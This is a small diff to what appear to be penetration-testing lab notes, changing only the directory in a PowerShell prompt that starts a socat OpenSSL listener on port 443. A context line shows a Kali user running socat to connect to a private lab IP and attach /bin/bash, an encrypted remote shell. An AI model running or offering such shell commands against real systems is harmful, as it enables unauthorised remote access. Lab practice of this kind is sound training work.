@@ -79,6 +79,6 @@
 
 ### Linux
 
-    PS C:\Tools\practical_tools\socat> .\socat.exe OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0 STDOUT
+    PS C:\Users\gotburzt> .\socat.exe OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0 STDOUT
 
     gothburz@kali:~$ sudo socat OPENSSL:192.168.134.10:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
